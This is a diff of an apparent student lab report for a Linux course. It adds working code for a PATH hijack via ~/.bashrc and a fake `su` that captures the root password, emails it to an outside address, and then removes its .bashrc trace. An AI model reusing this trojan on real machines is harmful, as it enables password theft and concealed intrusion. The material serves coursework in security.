@@ -35,6 +35,8 @@ Kaiwen Zhang  519370910188
 
 #### Hacking mum’s computer  
 
+For detailed implementation of this part, see chapter **Implementation**.
+
 - **How adjust the PATH, ensure its new version is loaded but then forgotten?**
   * Modify `~/.bashrc`,  add `export PATH=$PATH:/place/with/the/file` as the end of the file
   * Remove this line after this shell script has been executed after booting.
@@ -157,11 +159,78 @@ Kaiwen Zhang  519370910188
 
   
 
-  
+## Implementation
+
+### Hacking password
+
+#### Sending Email from Command Line
+
+```shell
+# Install of email-service
+sudo apt install mailutils
+sudo apt install ssmtp
+
+
+
+# Then modify /etc/ssmtp/ssmtp.conf
+
+root=kevin_zhangcluthit@163.com
+mailhub=smtp.163.com:465
+AuthUser=kevin_zhangcluthit@163.com
+AuthPass=<The one generated in 163 settings>
+UseTLS=Yes
+
+# Next modify /etc/ssmtp/revaliases
+kevin-zhang:kevin_zhangcluthit@163.com:smtp.163.com:465
+
+```
+
+After this, the email can be sent from command line with `mail` command.
+
+#### Modify the `PATH` to use fake `su`
+
+in `hack.sh`
+
+```shell
+#!/bin/bash
+echo "PATH=/home/${USER}/VE482_lab/l10:${PATH}" >> ~/.bashrc #Detailed PATH depends on what you set~
+exec bash
+```
+
+#### Fake `su`
+
+```shell
+# First, write a shell script in name of `su`
+#!/bin/bash
+hack_passwd(){
+echo "Password:"
+read -s passwd
+#echo ${passwd} debug usage
+sleep 3
+echo "su: Authentication failure"
+mail -s "[Secret] Root Password of Mum" "kevin.zhang@sjtu.edu.cn" <<< ${passwd}
+}
+
+# Last part of this code is to clean the modified path
+#echo "test su"
+hack_passwd
+head -n -1 ~/.bashrc >> ~/.bashrc_tmp
+mv ~/.bashrc_tmp ~/.bashrc
+
+#Another thing to do is to modify the right of this `su`
+#Otherwise, it seems that this `su` won't be considered as a candidate for `su` command
+sudo chmod 755 su
+sudo chmod u+s su
+```
+
+#### Result
+
+
+
 
 ## Reference
 
-[1] [How to Create Groups in Linux (groupadd Command) | Linuxize](https://linuxize.com/post/how-to-create-groups-in-linux/#:~:text=The general syntax for the groupadd command is,type groupadd followed by the new group name.)
+[1] [How to Create Groups in Linux (groupadd Command) | Linuxize](https://linuxize.com/post/how-to-create-groups-in-linux)
 
 [2] [udev(8) - Linux man page (die.net)](https://linux.die.net/man/8/udev)
 
